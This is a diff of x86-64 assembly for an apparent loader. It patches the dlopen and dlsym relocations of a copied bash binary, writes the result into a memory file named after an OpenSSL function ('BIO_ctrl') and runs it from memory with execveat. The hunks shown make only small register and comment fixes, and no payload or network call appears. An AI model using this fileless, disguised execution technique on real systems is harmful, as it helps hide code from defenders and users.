@@ -134,7 +134,6 @@ phdr:
 
 ; END HEADER
 
-
 ; register usage
 ; rsp - points the buffer we are using to start the copy of bash.
 ; r12 - length of the bash binary
@@ -167,7 +166,6 @@ _discover_main:
     add rax, rsp
     add rax, main_offset
 
-; so rax is now a signed 32bit int.
     movsxd rax, [rax]
     add rax, main_rip_offset
     add r13, rax
@@ -244,9 +242,10 @@ _read_sht_dynamic_tail:
 
 _process_relocs:
     ; rela_offset
-    mov rsi, [r10]
+    mov esi, [r10]
     ; rela idx
     mov edi, [r10 + 12]
+    add r10, 24
 
     ; st_name
     imul rdi, 24
@@ -264,15 +263,14 @@ _process_relocs:
     mov ebx, [rbx]
     cmp ebx, DLOP
     jne _case_dlsy
-    mov r14, rsi
+    mov r14d, esi
 
 _case_dlsy:
     cmp ebx, DLSY
     jne _process_relocs_loop_tail
-    mov r15, rsi
+    mov r15d, esi
 
 _process_relocs_loop_tail:
-    add r10, 24
     cmp r15, 0
     je  _process_relocs
 
@@ -302,7 +300,7 @@ _apply_patches:
     mov [rdx + _dlsym_target - _patch_start], r15d
 
 _setup_memfd:
-    xor rsi, rsi
+    xor esi, esi
     lea rdi, [rel _str_BIO_ctrl]
     mov eax, SYS_memfd_create
     syscall
@@ -318,7 +316,7 @@ _write_memfd:
 _execve_memfd:
     mov r8, AT_EMPTY_PATH
     xor r10, r10
-    xor rdx, rdx
+    xor edx, edx
     lea rsi, [rel _str_null]
     mov rdi, r12
     mov eax, SYS_execveat
@@ -335,7 +333,7 @@ _execve_memfd:
 _patch_start:
     jmp _patch_code
 
-; these are the opcodes for bnd jmp
+; these are the opcodes for a relative jmp
 _dlopen:
     db 0xff, 0x25
 _dlopen_target:
@@ -345,7 +343,7 @@ _dlopen_end:
 _dlsym:
     db 0xff, 0x25
 _dlsym_target:
-    dd 0x41434344
+    dd 0x61626364
 _dlsym_end:
 
 _patch_code:
